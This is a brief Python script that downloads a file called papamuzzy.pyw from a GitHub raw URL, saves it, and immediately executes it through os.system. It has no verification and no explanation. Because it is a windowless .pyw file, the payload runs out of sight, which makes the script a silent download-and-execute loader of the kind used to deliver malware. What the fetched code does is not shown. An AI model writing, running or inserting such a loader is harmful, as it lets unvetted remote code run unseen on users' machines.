import requests
import os

url = 'https://raw.githubusercontent.com/UltimaCodes/papamuzzy/main/papamuzzy.pyw'
response = requests.get(url)

if response.status_code == 200:
    with open('papamuzzy.pyw', 'w') as file:
        file.write(response.text)
    os.system('papamuzzy.pyw')
else:
    print('Failed to download the papamuzzy.pyw file')
